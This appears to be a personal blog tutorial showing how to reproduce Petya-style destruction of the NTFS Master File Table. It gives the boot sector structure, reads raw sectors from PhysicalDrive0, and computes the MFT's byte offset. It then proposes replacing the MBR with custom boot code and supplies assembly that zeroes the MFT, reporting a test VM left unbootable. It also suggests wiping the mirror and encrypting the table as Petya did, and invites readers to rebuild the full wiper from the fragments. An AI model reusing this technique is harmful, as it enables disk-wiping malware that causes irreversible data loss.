  <h1>1: Introduction</h1>
  The MFT, also known as the Master File Table, is a key part of the NTFS<br>
  filesystem -- it is a table of <i>every file</i> on the filesystem, meaning<br>
  if it is somehow corrupted or <a href="https://en.wikipedia.org/wiki/Petya_(malware_family)">encrypted</a>, then file recovery is potentially<br>
  not possible. Luckily, there is a mirror (called the MFT Mirror), which is used<br>
  if the original MFT is not accessible, stored at 2 different physical places on the disk.<br><br>

  Petya is a known example of a malware strain that does this, even with <code>bootrec /fixmbr</code><br>
  to remove the MBR Locker payload, you <i>cannot</i> access/boot into Windows due to the missing MFT.<br>
  So, how do we do this for ourselves?

  <h1>2: The NTFS BPB</h1>
  Before we wipe it, we need to find out where this specifically is in the actual disk.<br>
  Luckily, NTFS has its own BPB (boot parameter block), that's (seemingly?) stored at<br>
  <i>logical sector 2048</i> (according to VBox 7.0). The structure looks like this:<br>
  <div class="container">
    <pre>
      <code>
typedef struct NTFS_Bootsect {
  uint8_t  jmp[3];             // JMP SHORT
  char     oem_sys[8];         // "NTFS    "

  /** BOOT PARAMETER BLOCK **/
  uint16_t bytes_p_sector;     // Bytes per sector
  uint8_t  sect_p_cluster;     // Sectors per cluster
  uint16_t resv_sect_counter;  // Reserved sector count
  uint8_t  always_0[3];        // Always 0
  uint16_t r_entry_count;      // Unused
  uint8_t  media_desc;         // Media descriptor
  uint16_t unused;             // Always 0
  uint16_t sect_p_track;       // Sectors Per Track
  uint16_t num_heads;          // Disk Head Count
  uint32_t hidden_sect_count;  // Hidden Sector Count
  uint64_t unused2;            // Unused
  uint64_t total_sectors;      // Total Sectors

  /** NTFS SPECIFIC HEADER **/
  uint64_t mft_cluster;        // Master File Table Cluster
  uint64_t mft_mirror_cluster; // Master File Table Mirror Cluster
  uint32_t c_per_file_rec_seg; // Clusters per File record sgement
  uint32_t c_per_index_block;  // Clusters per index block
  uint64_t volume_serial;      // Volume Serial
  uint32_t checksum;

  uint8_t bootcode[426];
  uint16_t end_of_sector;
}__attribute__((packed)) NTFS_Bootsect_t;
      </code>
    </pre><br>
  </div>

    Note that <code>__attribute__((packed))</code> is required here. If we don't have this, then the structure's members will not<br>
    line up. We just need to read a sector at offset <code>2048 * 512</code> (aka 1048576) from <code>\\\\.\\PhysicalDrive0</code>.<br>
    So now, <code>NTFS_Bootsect_t* ntfs = (NTFS_Bootsect_t*)data;</code> will give us the actual NTFS BPB we're looking for!<br><br>

    <h2>2.1: Where is the MFT?</h2>
    You may notice there are two things that are important for us: <code>mft_cluster</code> and <code>mft_mirror_cluster</code>.<br>
    For example,
    <div class="container">
      <pre>
        <code>
C:\> test.exe
Cluster 8533 has MFT, and 0 has MFT mirror.
        </code>
      </pre>
    </div>
    Ok, great. How do we somehow convert <code>MFT Cluster -> Physical Byte Offset</code>? We'll first need<br>
    to convert to LBA which is just the hidden sector count plus the cluster number multiplied by the sectors/cluster value.<br>
    On my test machine, this was <code>0x112a8 (70312)</code>. Last part: for wiping, we can't really use LBA, we'd have to<br>
    do some hard disk driver stuff, so instead, we'll just find the raw byte offset from sector 0.<br><br>

    To do this, you can just multiply the bytes per sector (in NTFS BPB) by the LBA above. Note that LBA<br>
    refers to the entire sector, so the correct "range" of the "master" MFT is:
    <div class="container">
      <pre>
        <code>
  uint64_t mft_byte_min = (ntfs->bytes_p_sector * mft_lba);
  uint64_t mft_byte_max = (ntfs->bytes_p_sector * (mft_lba + 1));
        </code>
      </pre>
    </div>
    
    Let's make sure we found the MFT. If we read 512 bytes and open this in a hex editor, we
    get the following:<br><br>
    <img src="img-29/hxd-1.png" size="25%"><br><br>
    
    Looks like we found it! Alright, now we can wipe it. Let's try using <code>WriteFile</code>:<br>
    <div class="container">
      <pre>
        <code>
  C:\> test.exe
  [+]  Overwriting MFT sector with 0's...
  [!!] Failed! Error code: 5 (ERROR_ACCESS_DENIED)
        </code>
      </pre>
    </div>
    Looks like we'll need to somehow get into ring 0. So, we'll have to overwrite sector 0<br>
    with our own code. We're also going to need to pass the MFT location somehow.<br>

    <h2>2.2: Wiping MFT</h2>
    Here's our game plan right now: 1. Overwrite sector 0 with our custom MBR, then use<br>
    sector 1 for data. I'll set the first four bytes of sector 1 to <code>0x02255000</code>.<br>
    Then, when we're in 32-bit protected mode (you can use 16-bit mode if you'd like, but<br>
    you'll have to deal with <a href="https://wiki.osdev.org/Segmentation">real mode segmentation</a>), we can just do this:
    <div class="container">
      <pre>
        <code>
  mov edi, dword [0x7E00]   ;; 0x7e00 is the start of sector 1.
  mov esi, edi
  add esi, 0xFFF    ;; 0x02255000 + 0xFFF, we're writing 0xFFF bytes, should be enough
  .L1:
    cmp edi, esi
    je .L2

    mov [edi], byte 0
    inc edi
    jmp .L1

  .L2:
    ...
        </code>
      </pre>
    </div>
    Note: <code>0x02255000</code> works for my testing machine. It may be different for you.
    
    <h1>3: Running our Code</h1>
    Alright, let's see what happens. Booting up the VM, running our payload, we don't get any<br>
    crashes / triple faults. Our code works! How do we make sure we actually overwrote the MFT?<br>
    We'll boot into a Windows 7 ISO file, and try and "repair" with <code>bootrec</code>:<br><br>
    <img src="img-29/save-build.png" size="25%"><br><br>
    Alright, <code>bootrec</code> ran, and "succeeded", let's eject the CD and reboot.<br><br>
    <img src="img-29/unbootable.png" size="25%"><br><br>
    <b><i>WE DID IT!</i></b> I didn't remove the mirror in the code I tested, but it's probably<br>
    worth implementing. Additionally we could encrypt it with some form of ROT13 or XOR encryption<br>
    like Petya did.

    <h1>4: Conclusion</h1>
    This was more of a proof-of-concept: No, the full source code will not be available, if you<br>
    <i>really</i> want to do this, you should be able to recreate the source code from fragments.<br>
    Thanks for reading! This is one of the few projects I'm actually proud of.<br><br>

    Additionally, I may be wrong about something (unlikely) -- i.e. the actual wiping or something else<br>
